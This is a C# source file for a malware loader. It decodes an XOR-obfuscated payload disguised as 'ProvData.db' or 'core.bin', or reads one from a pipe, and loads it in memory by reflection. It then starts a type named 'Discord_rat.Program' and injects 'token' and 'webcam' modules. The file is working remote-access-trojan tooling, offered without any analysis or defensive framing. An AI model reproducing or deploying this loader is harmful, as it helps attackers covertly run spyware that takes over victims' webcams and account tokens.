using System;
using System.IO;
using System.Reflection;

namespace Loader
{
    internal static class Program
    {
        private const byte XorKey = 0xA7;

        [STAThread]
        private static void Main(string[] args)
        {
            if (args.Length > 0 && args[0] == "--pipe")
            {
                RunFromPipe();
                return;
            }

            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            byte[] payloadBytes = LoadPayloadBytes(baseDir);
            if (payloadBytes == null || payloadBytes.Length == 0)
            {
                return;
            }

            StartPayload(payloadBytes, null, null, baseDir);
        }

        private static void RunFromPipe()
        {
            Stream input = Console.OpenStandardInput();
            byte[] core = ReadExact(input, ReadLength(input));
            byte[] token = ReadExact(input, ReadLength(input));
            byte[] media = ReadExact(input, ReadLength(input));
            StartPayload(core, token, media, null);
        }

        private static int ReadLength(Stream input)
        {
            byte[] lenBytes = ReadExact(input, 4);
            return BitConverter.ToInt32(lenBytes, 0);
        }

        private static byte[] ReadExact(Stream input, int length)
        {
            if (length <= 0)
            {
                return new byte[0];
            }

            byte[] buffer = new byte[length];
            int offset = 0;
            while (offset < length)
            {
                int read = input.Read(buffer, offset, length - offset);
                if (read <= 0)
                {
                    throw new EndOfStreamException("Unexpected end of pipe stream.");
                }
                offset += read;
            }
            return buffer;
        }

        private static void StartPayload(byte[] payloadBytes, byte[] tokenBytes, byte[] mediaBytes, string payloadRoot)
        {
            Assembly payload = Assembly.Load(payloadBytes);
            Type programType = payload.GetType("Discord_rat.Program");
            if (programType == null)
            {
                return;
            }

            if (!string.IsNullOrEmpty(payloadRoot))
            {
                FieldInfo rootField = programType.GetField("PayloadRoot", BindingFlags.Public | BindingFlags.Static);
                if (rootField != null)
                {
                    rootField.SetValue(null, payloadRoot);
                }
            }

            if (tokenBytes != null && tokenBytes.Length > 0)
            {
                SetEmbeddedModule(programType, "token", tokenBytes);
            }

            if (mediaBytes != null && mediaBytes.Length > 0)
            {
                SetEmbeddedModule(programType, "webcam", mediaBytes);
            }

            MethodInfo startMethod = programType.GetMethod("Start", BindingFlags.Public | BindingFlags.Static);
            if (startMethod != null)
            {
                startMethod.Invoke(null, null);
            }
        }

        private static void SetEmbeddedModule(Type programType, string key, byte[] data)
        {
            FieldInfo field = programType.GetField("EmbeddedModules", BindingFlags.Public | BindingFlags.Static);
            if (field == null)
            {
                return;
            }

            var modules = field.GetValue(null) as System.Collections.Generic.Dictionary<string, byte[]>;
            if (modules == null)
            {
                modules = new System.Collections.Generic.Dictionary<string, byte[]>();
                field.SetValue(null, modules);
            }

            modules[key] = data;
        }

        private static byte[] LoadPayloadBytes(string baseDir)
        {
            string[] protectedNames = { "ProvData.db", "core.bin" };
            foreach (string name in protectedNames)
            {
                string protectedPath = Path.Combine(baseDir, name);
                if (File.Exists(protectedPath))
                {
                    return XorDecode(File.ReadAllBytes(protectedPath));
                }
            }

            string devPath = Path.Combine(baseDir, "Discord rat.dll");
            if (File.Exists(devPath))
            {
                return File.ReadAllBytes(devPath);
            }

            return null;
        }

        private static byte[] XorDecode(byte[] data)
        {
            byte[] decoded = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                decoded[i] = (byte)(data[i] ^ XorKey);
            }
            return decoded;
        }
    }
}
